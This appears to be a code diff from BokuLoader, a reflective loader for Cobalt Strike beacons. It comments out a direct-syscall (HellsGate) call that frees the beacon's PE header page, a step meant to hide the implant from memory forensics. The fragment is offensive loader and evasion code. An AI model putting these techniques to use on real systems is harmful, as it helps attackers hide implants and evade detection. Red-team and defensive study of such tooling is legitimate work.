@@ -36,9 +36,9 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     // Deallocate the first memory page for the beacon we are loading
     // This way after cleanup there will be no beacon PE headers in the process
-    size = rdll_src.SizeOfHeaders;
-    HellsGate(getSyscallNumber(api.pNtFreeVirtualMemory));
-    ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
+    // size = rdll_src.SizeOfHeaders;
+    // HellsGate(getSyscallNumber(api.pNtFreeVirtualMemory));
+    // ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
   
     doSections(&rdll_dst, rdll_src);
     doImportTable(&api, &rdll_dst, rdll_src);
